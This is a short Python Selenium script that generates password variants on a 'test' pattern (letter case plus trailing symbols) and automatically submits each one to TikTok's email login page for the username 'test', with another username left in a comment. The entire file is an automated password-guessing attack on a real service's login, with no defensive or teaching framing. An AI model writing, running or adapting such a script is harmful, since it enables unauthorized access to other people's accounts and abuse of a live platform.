
import random
from selenium import webdriver
import time


#Going to the website
driver = webdriver.Chrome()
# driver.get("https://www.tiktok.com/login/phone-or-email/email")
# username = driver.find_element_by_xpath('//*[@id="root"]/div/div[1]/form/div[2]/div/input')
# password = driver.find_element_by_xpath('//*[@id="root"]/div/div[1]/form/div[3]/div/input')
#Password Generation
new = ['first']
letters = ['F', 'f']
characters = ['!','*','x']

list1 = []
for i in range(6561):
    first_letter = random.choice([0,1])
    last_character = random.choice([0,1,2])
    last_character_2 = random.choice([0,1,2])
    test = letters[first_letter]+"test"+characters[last_character_2]+characters[last_character]
    list1.append(test)


new = list(set(list1))
print(len(new))


#username.send_keys("grrrharubi")
for i in range(len(new)-1):
    driver.get("https://www.tiktok.com/login/phone-or-email/email")
    username = driver.find_element_by_xpath('//*[@id="root"]/div/div[1]/form/div[2]/div/input')
    password = driver.find_element_by_xpath('//*[@id="root"]/div/div[1]/form/div[3]/div/input')
    username.send_keys("test")
    password.send_keys(new[i])
    submit_button = driver.find_elements_by_xpath('//*[@id="root"]/div/div[1]/form/button')[0]
    submit_button.click()
    time.sleep(1)
    # driver.get("https://www.tiktok.com/login/phone-or-email/email")

    
        







    
    